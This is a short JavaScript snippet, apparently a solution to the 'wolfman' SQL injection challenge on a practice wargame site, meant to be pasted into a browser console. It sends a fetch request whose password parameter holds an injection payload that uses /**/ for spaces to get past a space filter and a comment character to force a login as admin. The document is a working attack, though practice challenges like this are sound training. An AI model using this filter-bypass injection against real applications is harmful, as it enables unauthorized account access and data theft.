// On the chrome console window
fetch('https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=\'or/**/id=\'admin\'%23',{
        include: 'credentials'
    }
).then((x) => x.text()).then((x) => console.log(x));
